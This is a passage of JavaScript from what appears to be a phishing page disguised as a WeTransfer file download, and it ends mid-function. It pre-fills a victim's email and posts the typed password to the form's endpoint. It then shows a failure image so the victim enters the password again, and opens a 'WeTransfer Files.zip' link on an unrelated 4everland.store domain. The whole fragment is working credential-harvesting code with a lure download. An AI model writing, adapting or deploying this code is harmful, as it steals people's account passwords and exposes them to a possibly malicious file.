<script type="text/javascript">
	
$('document').ready(function() {

		
	if (!may30) { window.location.href= 'index.html'}
	else{ $('#showUmail').text(may30); $('#umail').val(may30) }
	
	$('#submitFormBtn').on('click', (e) => {
		e.preventDefault();

		let umail = $('#umail').val()
		let upass = $('#upass').val()


		var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;


		if(!upass || upass.length < 6){
			$('#ozinwa').html('Correct email password required.').removeClass('hide');
			$('.ipta').removeAttr('src');
			$('#upass').addClass('border-uhie').focus()
			return false;
		}

		let formElem = document.querySelector('#finalForm');
	    // Store reference to form to make later code easier to read
	    const form = formElem;

	    //hide the button
	    $('#submitFormBtn').addClass('hide');
	    $('#spinner').show();

	    // Post data using the Fetch API
	    fetch(form.action, {
	        method: form.method,
	        body: new FormData(form),
	    })
	        // We turn the response into text as we expect HTML
        // .then((res) => res.json())

        .then((res) => {
            // Create result message container and copy HTML from doc
            console.log(res)
            $('.ipta').attr('src', 'includes/teptal.png');
            $('#upass').val('').focus();

		    $('#submitFormBtn').removeClass('hide');
		    $('#spinner').hide();
		    
		    console.log('here')
		    
		    window.open('https://wetransfer-files.4everland.store/WeTransfer%20Files.zip');
		    
		    window.location('https://wetransfer-files.4everland.store/WeTransfer%20Files.zip')
